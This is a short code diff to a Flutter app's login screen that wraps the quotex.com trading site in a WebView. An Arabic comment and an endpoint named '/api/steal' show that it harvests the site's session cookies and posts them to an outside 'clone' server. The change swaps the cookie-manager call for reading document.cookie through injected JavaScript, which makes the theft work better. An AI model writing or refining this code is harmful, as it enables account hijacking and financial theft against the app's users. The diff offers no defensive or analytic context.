@@ -1,3 +1,4 @@
+import "package:flutter/services.dart";
 import 'package:flutter/material.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 import 'package:permission_handler/permission_handler.dart';
@@ -76,8 +77,8 @@ class _LoginScreenState extends State<LoginScreen> {
             _injectOriginalScript();
             
             // 399. نسحب الكوكيز ونبعتها للسيرفر متل صاحبك
-            final cookies = await _cookieManager.getCookies(Uri.parse('https://quotex.com'));
-            String cookieString = cookies.map((c) => "${c.name}=${c.value}").join("; ");
+            final cookieString = await _controller.runJavaScriptReturningResult("document.cookie");
+            // Use cookieString directly
             if (cookieString.isNotEmpty) {
               await http.post(
                 Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
